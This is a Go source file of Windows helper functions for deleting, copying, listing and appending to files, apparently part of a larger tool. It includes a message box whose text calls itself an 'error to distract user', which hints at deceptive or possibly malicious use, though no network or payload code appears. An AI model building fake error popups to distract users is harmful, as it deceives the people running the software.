package main

import (
	"bufio"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"syscall"
	"unsafe"
)

func messagebox(err error) {
	user32 := syscall.MustLoadDLL("user32.dll")
	mbox := user32.MustFindProc("MessageBoxW")

	title := "Error:"
	message := "Error to distract user." + err.Error()
	mbox.Call(0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(message))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(title))),
		0)
}

func deleteFile(filename string) {
	err := os.Remove(filename)
	if err != nil {
		if DEBUG {
			messagebox(err)
		}
		return
	}
	wg.Done()
}

func unLock(filename string) {
	err := os.Remove(filename)
	if err != nil {
		if DEBUG {
			messagebox(err)
		}
		return
	}
}

func systemd(content string) {
	for _, v := range readFileByLine() {
		if v == content {
			return
		}
	}

	f, err := os.OpenFile(tmpFile, os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println(err)
		return
	}

	_, err = fmt.Fprintln(f, content)
	if err != nil {
		fmt.Println(err)
		f.Close()
		return
	}

	err = f.Close()
	if err != nil {
		fmt.Println(err)
		return
	}
	if DEBUG {
		fmt.Println("file appended successfully")
	}
}

func getAllFile(path string) []string {
	var filenames []string
	files, _ := ioutil.ReadDir(path)
	for _, f := range files {
		if !f.IsDir() {
			filenames = append(filenames, f.Name())
			fmt.Println(f.Name())
		}
	}
	return filenames
}

func readFileByLine() []string {
	var arr []string
	f, err := os.Open(tmpFile)
	if err != nil {
		fmt.Println(err)
	}
	defer f.Close()
	s := bufio.NewScanner(f)
	for s.Scan() {
		arr = append(arr, s.Text())
	}
	err = s.Err()
	if err != nil {
		fmt.Println(err)
	}

	return arr
}

func IsExist(path string) bool {
	_, err := os.Stat(path)
	//messagebox(err)
	return err == nil || os.IsExist(err)
}

func copy(src, dst string) (int64, error) {
	defer wg.Done()
	sourceFileStat, err := os.Stat(src)
	if err != nil {
		return 0, err
	}

	if !sourceFileStat.Mode().IsRegular() {
		return 0, fmt.Errorf("%s is not a regular file", src)
	}

	source, err := os.Open(src)
	if err != nil {
		return 0, err
	}
	defer source.Close()

	destination, err := os.Create(dst)
	if err != nil {
		return 0, err
	}

	defer destination.Close()
	nBytes, err := io.Copy(destination, source)
	return nBytes, err
}
